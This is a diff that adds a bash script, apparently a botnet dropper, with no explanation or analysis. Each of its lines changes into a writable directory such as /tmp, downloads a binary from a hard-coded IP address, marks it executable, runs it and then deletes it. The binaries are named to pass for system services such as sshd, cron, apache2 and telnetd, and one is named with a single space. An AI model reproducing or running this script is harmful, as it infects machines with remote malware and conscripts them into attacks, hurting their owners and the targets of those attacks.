@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.163.221.181/ntpdhpa; chmod +x ntpdhpa; ./ntpdhpa; rm -rf ntpdhpa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.163.221.181/sshdhpa; chmod +x sshdhpa; ./sshdhpa; rm -rf sshdhpa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.163.221.181/opensshhpa; chmod +x opensshhpa; ./opensshhpa; rm -rf opensshhpa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.163.221.181/bashhpa; chmod +x bashhpa; ./bashhpa; rm -rf bashhpa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.163.221.181/tftphpa; chmod +x tftphpa; ./tftphpa; rm -rf tftphpa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.163.221.181/wgethpa; chmod +x wgethpa; ./wgethpa; rm -rf wgethpa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.163.221.181/cronhpa; chmod +x cronhpa; ./cronhpa; rm -rf cronhpa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.163.221.181/ftphpa; chmod +x ftphpa; ./ftphpa; rm -rf ftphpa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.163.221.181/pftphpa; chmod +x pftphpa; ./pftphpa; rm -rf pftphpa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.163.221.181/shhpa; chmod +x shhpa; ./shhpa; rm -rf shhpa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.163.221.181/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.163.221.181/apache2hpa; chmod +x apache2hpa; ./apache2hpa; rm -rf apache2hpa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.163.221.181/telnetdhpa; chmod +x telnetdhpa; ./telnetdhpa; rm -rf telnetdhpa
